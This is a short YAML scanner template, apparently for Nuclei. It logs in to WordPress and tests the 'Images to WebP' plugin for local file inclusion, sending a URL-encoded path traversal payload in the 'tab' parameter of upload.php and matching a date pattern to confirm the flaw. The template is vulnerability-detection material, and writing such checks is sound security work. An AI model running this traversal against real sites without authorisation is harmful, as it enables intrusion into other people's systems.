id: wordpress-images-webp-lfi-date-regex

info:
  name: WordPress Images to WebP - Date Regex Match
  author: Sourabh-Sahu
  severity: medium
  description: |
    Logs in to WordPress and checks for leaked date matching regex format in vulnerable plugin.


http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1

      - |
        GET /wp-admin/upload.php?page=images-to-webp.php&tab=..%2F..%2F..%2F..%2Fwp-links-opml HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{login_cookie}}

    cookie-reuse: true

    extractors:
      - type: regex
        name: login_cookie
        part: header
        internal: true
        regex:
          - "wordpress_logged_in_[^=]+=([^;]+);"

    matchers:
      - type: regex
        part: body
        regex:
          - "[A-Za-z]{3}, [0-9]{2} [A-Za-z]{3} 20[0-9]{2}"
